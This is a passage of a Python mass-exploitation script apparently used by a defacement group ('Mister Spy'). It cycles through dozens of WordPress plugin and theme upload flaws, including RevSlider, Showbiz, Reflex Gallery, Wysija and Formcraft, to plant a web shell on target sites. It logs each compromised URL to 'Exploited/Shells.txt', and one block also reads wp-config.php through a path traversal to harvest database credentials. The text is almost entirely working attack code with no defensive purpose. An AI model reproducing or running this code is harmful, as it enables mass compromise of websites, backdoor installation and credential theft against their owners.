		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit IncredibleWP  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit IncredibleWP  \033[91m[Failed] '.format(sn)


        #ultimatum +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit ultimatum  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit ultimatum  \033[91m[Failed] '.format(sn)


        #medicate +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit medicate  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit medicate  \033[91m[Failed] '.format(sn)


        #centum +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/centum/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit centum  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/centum/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit centum  \033[91m[Failed] '.format(sn)


        #beach_apollo +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit beach_apollo  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit beach_apollo  \033[91m[Failed] '.format(sn)

        #cuckootap +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit Cuckootap  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Cuckootap  \033[91m[Failed] '.format(sn)



        #pindol +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/pindol/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit pindol  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/pindol/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit pindol  \033[91m[Failed] '.format(sn)


        #designplus +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit designplus  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit designplus  \033[91m[Failed] '.format(sn)

        #rarebird +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit rarebird  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit rarebird  \033[91m[Failed] '.format(sn)

        #andre +

		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
			print '\033[92m[>] \033[0mExploit andre  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit andre  \033[91m[Failed] '.format(sn)
	
		#12 Showbiz
		
		
		showbizapp = {'action':'showbiz_ajax_action',
					    'client_action':'update_plugin'}
						
						
		showbizup = {'update_file':(filenames, shell, 'text/html')}
		
		showbizreq = requests.post(url+'/wp-admin/admin-ajax.php', data=showbizapp , files=showbizup)
		
		showbizlib = requests.get(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames)
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in showbizlib.content:
			print '\033[92m[>] \033[0mExploit showbiz  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Showbiz  \033[91m[Failed] '.format(sn)
			
			
		#13 Reflex Gallery
		
		Reflexup = {'qqfile' : (filenames, shell, 'text/html')}
		
		Reflexreq = requests.post(url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=12', files=Reflexup)
		
		Reflexlib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Reflexlib.content:
			print '\033[92m[>] \033[0mExploit Reflex Gallery  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Reflex Gallery  \033[91m[Failed] '.format(sn)	
		
		
		
		
		#14 Wysija
		
		Wysijaup = {'my-theme':open('Files/Master.zip', 'rb')}
		
		
		Wysijaapp = {'action':'themeupload',
				   'submitter':'Upload',
				   'overwriteexistingtheme':'on',
				   'page':'GZNeFLoZAb'}
				   
				   
		Wysijareq = requests.post(url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes' , data=Wysijaapp, files=Wysijaapp)
		
		Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Wysijalib.content:
			print '\033[92m[>] \033[0mExploit Wysija  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Wysija  \033[91m[Failed] '.format(sn)	
		
		
		
		
		#16 Tevolution
		
		
		Tevoup = {'file':(filenames, shell, 'text/html')}
		
		Tevoreq = requests.post(url+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=Tevoup)
		
		Tevorlib = requests.get(url+'/wp-content/themes/Directory/images/tmp/'+filenames)
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Tevorlib.content:
			print '\033[92m[>] \033[0mExploit Tevolution  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/Directory/images/tmp/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Tevolution  \033[91m[Failed] '.format(sn)


		
		#17 Cherry
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Cherrylib.content:
			print '\033[92m[>] \033[0mExploit Cherry Plugin  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Cherry Plugin  \033[91m[Failed] '.format(sn)		


		
		#18 Revslider Config
		
		revlib = requests.get(url+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '\033[92m[>] \033[0mExploit Revslider Config  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Revslider Config  \033[91m[Failed] '.format(sn)		


		
		#19 property
		
		propertyup = {'Filedata':(filenames, shell, 'text/html')}
		
		propertyreq = requests.post(url+'/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', files=propertyup)
		
		propertylib = requests.get(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in propertylib.content:
			print '\033[92m[>] \033[0mExploit WP Property  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit WP Property  \033[91m[Failed] '.format(sn)


		
		#20 simple
		
		mzoo = {'action': 'upload_ad_imag', 
				'path': ''}
		
		simpleup = {'uploadfile':(filenames, shell, 'text/html')}
		
		simplereq = requests.post(url+'/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php',data=mzoo, files=simpleup)
		
		simplelib = requests.get(url+'/wp-content/plugins/simple-ads-manager/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in simplelib.content:
			print '\033[92m[>] \033[0mExploit Ads Manager  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/simple-ads-manager/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Ads Manager  \033[91m[Failed] '.format(sn)			
			

		#21 videogallery
		
		dayi = {'file_field': (filevid, shell, 'text/html')}

		dayireq = requests.post(url+'/wp-content/plugins/dzs-videogallery/admin/upload.php', files=dayi)

		
		
		dayilib = requests.get(url+'/wp-content/plugins/dzs-videogallery/admin/upload/'+filenames+'\n')
		
		
		if 'Hacked By Mister Spy' in dayilib.content:
			print '\033[92m[>] \033[0mExploit Dzs Videogallery   \033[92m[Done] '.format(sn)
			open('Exploited/Dzs.txt', 'a').write(url+'/wp-content/plugins/dzs-videogallery/admin/upload/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Dzs Videogallery   \033[91m[Failed] '.format(sn)			


	
			
		#23 eptonic
		
		eptonicup = {'qqfile':(filenames, shell, 'text/html')}
		
		eptonicreq = requests.post(url+'/wp-content/themes/eptonic/functions/jwpanel/scripts/valums_uploader/php.php', files=eptonicup)
		
		eptoniclib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in eptoniclib.content:
			print '\033[92m[>] \033[0mExploit Eptonic   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Eptonic   \033[91m[Failed] '.format(sn)

			
		#24 saico
		
		saicoup = {'qqfile':(filenames, shell, 'text/html')}
		
		saicoreq = requests.post(url+'/wp-content/themes/saico/framework/_scripts/valums_uploader/php.php', files=saicoup)
		
		saicolib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in saicolib.content:
			print '\033[92m[>] \033[0mExploit Saico   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Saico   \033[91m[Failed] '.format(sn)

			
		#25 barclaycart
		
		barclaycartup = {'Filedata':(filenames, shell, 'text/html')}
		
		barclaycartreq = requests.post(url+'/wp-content/plugins/barclaycart/uploadify/uploadify.php', files=barclaycartup)
		
		barclaycartlib = requests.get(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in barclaycartlib.content:
			print '\033[92m[>] \033[0mExploit Barclaycart   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Barclaycart   \033[91m[Failed] '.format(sn)

			
		#26 sexy
		
		sexyup = {'files[]':(filenames, shell, 'text/html')}
		
		sexyreq = requests.post(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', files=sexyup)
		
		sexylib = requests.get(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sexylib.content:
			print '\033[92m[>] \033[0mExploit Sexy-Cntact-Form   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Sexy-Cntact-Form   \033[91m[Failed] '.format(sn)

			
		#27 pinboard
		
		pinboardup = {'Filedata':(filenames, shell, 'text/html')}
		
		pinboardreq = requests.post(url+'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1', files=pinboardup)
		
		pinboardlib = requests.get(url+'/wp-content/themes/pinboard/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in pinboardlib.content:
			print '\033[92m[>] \033[0mExploit Pinboard   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/pinboard/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Pinboard   \033[91m[Failed] '.format(sn)

			
		#28 pitchprint
		
		pitchprintup = {'files[]':(filenames, shell, 'text/html')}
		
		pitchprintreq = requests.post(url+'/wp-content/plugins/pitchprint/uploader/', files=pitchprintup)
		
		pitchprintlib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in pitchprintlib.content:
			print '\033[92m[>] \033[0mExploit Pitchprint   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Pitchprint   \033[91m[Failed] '.format(sn)

			
		#29 evolve
		
		evolveup = {'qqfile':(filenames, shell, 'text/html')}
		
		evolvereq = requests.post(url+'/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php', files=evolveup)
		
		evolvelib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in evolvelib.content:
			print '\033[92m[>] \033[0mExploit Evolve   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Evolve   \033[91m[Failed] '.format(sn)

			
		#30 satoshi
		
		satoshiup = {'Filedata':(filenames, shell, 'text/html')}
		
		satoshireq = requests.post(url+'/wp-content/themes/satoshi/functions/upload-handler.php', files=satoshiup)
		
		satoshilib = requests.get(url+'/wp-content/satoshi/images/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in satoshilib.content:
			print '\033[92m[>] \033[0mExploit Satoshi   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/satoshi/images/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Satoshi   \033[91m[Failed] '.format(sn)

			
		#31 dandelion
		
		dandelionup = {'qqfile':(filenames, shell, 'text/html')}
		
		dandelionreq = requests.post(url+'/wp-content/themes/dandelion/functions/upload-handler.php', files=dandelionup)
		
		dandelionlib = requests.get(url+'/uploads/[years]/[month]/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dandelionlib.content:
			print '\033[92m[>] \033[0mExploit Dandelion   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/uploads/[years]/[month]/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Dandelion   \033[91m[Failed] '.format(sn)			

			
		#32 highlight
		
		highlightup = {'file':(filenames, shell, 'text/html')}
		
		highlightreq = requests.post(url+'/wp-content/themes/highlight/lib/utils/upload-handler.php', files=highlightup)
		
		highlightlib = requests.get(url+'/uploads/[years]/[month]/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in highlightlib.content:
			print '\033[92m[>] \033[0mExploit Highlight   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/uploads/[years]/[month]/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Highlight   \033[91m[Failed] '.format(sn)	

			
		#33 ithemes
		
		ithemesup = {'Filedata':(filenames, shell, 'text/html')}
		
		ithemesreq = requests.post(url+'/wp-content/themes/ithemes2/themify/themify-ajax.php?upload=1', files=ithemesup)
		
		ithemeslib = requests.get(url+'/wp-content/themes/ithemes2/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in ithemeslib.content:
			print '\033[92m[>] \033[0mExploit Ithemes2   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/ithemes2/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Ithemes2   \033[91m[Failed] '.format(sn)	

			
		#34 custom-background
		
		customup = {'Filedata':(filenames, shell, 'text/html')}
		
		customreq = requests.post(url+'/wp-content/plugins/custom-background/uploadify/uploadify.php', files=customup)
		
		customlib = requests.get(url+'/wp-content/plugins/custom-background/uploadify/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in customlib.content:
			print '\033[92m[>] \033[0mExploit Custom Background   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/custom-background/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Custom Background   \033[91m[Failed] '.format(sn)

			
		#35 amplus
		
		amplusup = {'file':(filenames, shell, 'text/html')}
		
		amplusreq = requests.post(url+'/wp-content/themes/amplus/functions/upload-handler.php', files=amplusup)
		
		ampluslib = requests.get(url+'/uploads/[years]/[month]/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in ampluslib.content:
			print '\033[92m[>] \033[0mExploit Amplus   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/uploads/[years]/[month]/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Amplus   \033[91m[Failed] '.format(sn)			

			
		#36 cnhk
		
		cnhkup = {'slideshow':(filenames, shell, 'text/html')}
		
		cnhkreq = requests.post(url+'/wp-content/plugins/cnhk-slideshow/uploadify/uploadify.php', files=cnhkup)
		
		cnhklib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cnhklib.content:
			print '\033[92m[>] \033[0mExploit Cnhk Slideshow   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Cnhk Slideshow   \033[91m[Failed] '.format(sn)

			
		#37 asset
		
		assetup = {'Filedata':(filenames, shell, 'text/html')}
		
		assetreq = requests.post(url+'/wp-content/plugins/asset-manager/upload.php', files=assetup)
		
		assetlib = requests.get(url+'/wp-content/uploads/assets/temp/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in assetlib.content:
			print '\033[92m[>] \033[0mExploit Asset Manager   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/assets/temp/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Asset Manager   \033[91m[Failed] '.format(sn)


		#38 private-conversation			
			
		yasbe = {'folder': '/test/'}
		
		asabo = {'file': (filenames, shell, 'text/html')}

		sonzreq = requests.post(url+'/wp-content/plugins/wordpress-member-private-conversation/doupload.php', data=yasbe, files=asabo)

		sonzlib = requests.get(url+'/wp-content/uploads/user_uploads/test/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzlib.content:
			print '\033[92m[>] \033[0mExploit Private Conversation   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/user_uploads/test/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Private Conversation   \033[91m[Failed] '.format(sn)			

			
		#39 cubed_v1.2
		
		cubedsup = {'uploadfile':(filenames, shell, 'text/html')}
		
		cubedsreq = requests.post(url+'/wp-content/themes/cubed_v1.2/functions/upload-handler.php', files=cubedsup)
		
		cubedslib = requests.get(url+'/wp-content/uploads/year/month/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cubedslib.content:
			print '\033[92m[>] \033[0mExploit Cubed V1.2   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/year/month/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Cubed V1.2   \033[91m[Failed] '.format(sn)

			
		#40 flipbook
		
		flipbookup = {'qqfile':(filenames, shell, 'text/html')}
		
		flipbookreq = requests.post(url+'/wp-content/plugins/flipbook/php.php', files=flipbookup)
		
		flipbooklib = requests.get(url+'/wp-includes/fb-images/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in flipbooklib.content:
			print '\033[92m[>] \033[0mExploit Flipbook   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-includes/fb-images/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Flipbook   \033[91m[Failed] '.format(sn)

			
		#41 wpstorecart
		
		wpstorecart = {'Filedata':(filenames, shell, 'text/html')}
		
		wpstorereq = requests.post(url+'/wp-content/plugins/wpstorecart/php/upload.php', files=wpstorecart)
		
		wpstorelib = requests.get(url+'/wp-content/uploads/wpstorecart/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in wpstorelib.content:
			print '\033[92m[>] \033[0mExploit Wpstorecart   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wpstorecart/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Wpstorecart   \033[91m[Failed] '.format(sn)

			
		#42 dance
		
		danceup = {'file':(filenames, shell, 'text/html')}
		
		dancereq = requests.post(url+'/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php', files=danceup)
		
		dancelib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dancelib.content:
			print '\033[92m[>] \033[0mExploit Dance Studio   \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Dance Studio   \033[91m[Failed] '.format(sn)

			
		#43 design
		
		designup = {'Filedata':(filenames, shell, 'text/html')}
		
		designreq = requests.post(url+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php', files=designup)
		
		designlib = requests.get(url+'/patch/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in designlib.content:
			print '\033[92m[>] \033[0mExploit Udesign    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/patch/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Udesign    \033[91m[Failed] '.format(sn)

			
		#44 wpshop
		
		wpshopup = {'wpshop_file':(filenames, shell, 'text/html')}
		
		wpshopreq = requests.post(url+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload', files=wpshopup)
		
		wpshoplib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in wpshoplib.content:
			print '\033[92m[>] \033[0mExploit Wpshop    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Wpshop    \033[91m[Failed] '.format(sn)

			
		#45 symposium
		
		symposiumup = {'fileToUpload':(filenames, shell, 'text/html')}
		
		symposiumreq = requests.post(url+'/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php', files=symposiumup)
		
		symposiumlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in symposiumlib.content:
			print '\033[92m[>] \033[0mExploit Symposium    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Symposium    \033[91m[Failed] '.format(sn)

			
		#46 formcraft
		
		formcraftup = {'files[]':(filenames, shell, 'text/html')}
		
		formcraftreq = requests.post(url+'/wp-content/plugins/formcraft/file-upload/server/php/', files=formcraftup)
		
		formcraftlib = requests.get(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in formcraftlib.content:
			print '\033[92m[>] \033[0mExploit Formcraft    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames+'\n')
			sys.exit()
		else:
